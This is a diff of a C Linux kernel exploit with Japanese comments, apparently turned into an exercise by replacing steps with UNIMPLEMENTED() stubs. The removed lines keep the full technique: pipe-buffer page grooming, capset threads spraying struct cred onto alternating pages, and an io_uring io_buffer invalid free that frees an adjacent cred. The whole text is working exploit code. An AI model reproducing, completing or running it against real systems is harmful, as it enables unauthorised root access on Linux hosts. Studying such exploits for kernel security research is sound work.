@@ -215,27 +215,27 @@ int main(void) {
 /**
  * capsetをしてくれるスレッドを用意する。
  */
-#define CAPSET_THREAD_NUM 0x80
+#define CAPSET_THREAD_NUM 0x50
   puts("[+] Creating capset threads...");
   pthread_t setcap_pids[CAPSET_THREAD_NUM];
-  for (int ix = 0; ix < CAPSET_THREAD_NUM; ix++) {
-    pthread_create(&setcap_pids[ix], NULL, setcap_worker, NULL);
-  }
+  UNIMPLEMENTED();
 
   /**
    * スレッドが作成されるまで少し待つ
    */
   usleep(1000);
+  pinning_thread(0);
 
   /**
    * 大量のパイプを用意する
    */
-#define SPRAY_PIPE_NUM 0x80
+#define SPRAY_PIPE_NUM 0x60
   puts("[+] Creating pipe buffers...");
   int pipefds[SPRAY_PIPE_NUM][2];
   for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
     if (pipe(pipefds[ix]) < 0) errExit("pipe");
   }
+  usleep(5000);
 
   /**
    * pipeに書き込むことでページを確保する。
@@ -243,26 +243,22 @@ int main(void) {
    * AllocatorのOrder-1以上のリストからページをSplitしてくる。
    */
   puts("[+] Draining pages from higher order lists...");
-  for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
-    write(pipefds[ix][1], iobufs, 1);
-  }
+  UNIMPLEMENTED();
 
   /**
    * 偶数番目のpipeを閉じることでバッファ(ページ)を解放してBuddy(Order-0)に返却する。
    * NOTE: ここで連続するページを解放してしまうと、
    * 　Buddy AllocatorがページをマージしてOrder-1以上に持っていってしまう。
    */
+  pinning_thread(0);
   puts("[+] Closing even pages...");
-  for (int ix = 0; ix < SPRAY_PIPE_NUM; ix += 2) {
-    close(pipefds[ix][0]);
-    close(pipefds[ix][1]);
-  }
+  UNIMPLEMENTED();
 
   /**
    * capsetスレッドに対して、pipe_bufferによるページ分割が終わったことを通知する。
    * これを合図にcapsetスレッドは`struct cred`を奇数ページから確保する。
    */
-  state->page_split = 1;
+  UNIMPLEMENTED();
 
   /**
    * credのスプレーが終わるまで待つ。
@@ -270,16 +266,14 @@ int main(void) {
   while (state->cred_spray_num < CAPSET_THREAD_NUM) {
     usleep(1000);
   }
+  pinning_thread(0);
 
   /**
    * 奇数番目のpipeを閉じてBuddy(Order-0)に返却する。
    * このページはのちほどkmalloc-32(io_buffer)用に利用する。
    */
   puts("[+] Closing odd pages...");
-  for (int ix = 1; ix < SPRAY_PIPE_NUM; ix += 2) {
-    close(pipefds[ix][0]);
-    close(pipefds[ix][1]);
-  }
+  UNIMPLEMENTED();
 
   /**
    * 大量の`io_buffer`をkmalloc-32に確保する。
@@ -287,24 +281,15 @@ int main(void) {
    * 先程解放した偶数ページが利用されることになる。
    */
   puts("[+] Allocating io_buffer in odd pages...");
-  ring_submit_buffer(&ring, (char *)iobufs, PAGE, NUM_IOBUF, 0, 0);
-  ring_wait_cqe(&ring);
+  UNIMPLEMENTED();
 
   /**
    * io_bufferのinvalid freeを使って次のページにあるcredをfreeする。
    */
-  puts("[+] Invoking invalid free of cred...!");
   const ulong cred_offset =
-      0x180;  // HEURISTIC: 最後のio_bufferと次のページまでのオフセット
-  ring_submit_read(&ring, fd, 0x180, 0, 0);
-  assert(ring_wait_cqe(&ring) == 0x180);
-
-  /**
-   * ここでGDBをアタッチする。
-   * 最後の`io_buffer`のあるページを確認し、その次にあるページが
-   * `struct cred`であることを確認する。
-   */
-  sleep(9999);  // unreachable
+      0x140;  // HEURISTIC: 最後のio_bufferと次のページまでのオフセット
+  ring_submit_read(&ring, fd, cred_offset, 0, 0);
+  assert(ring_wait_cqe(&ring) == cred_offset);
 
   return 0;
 }
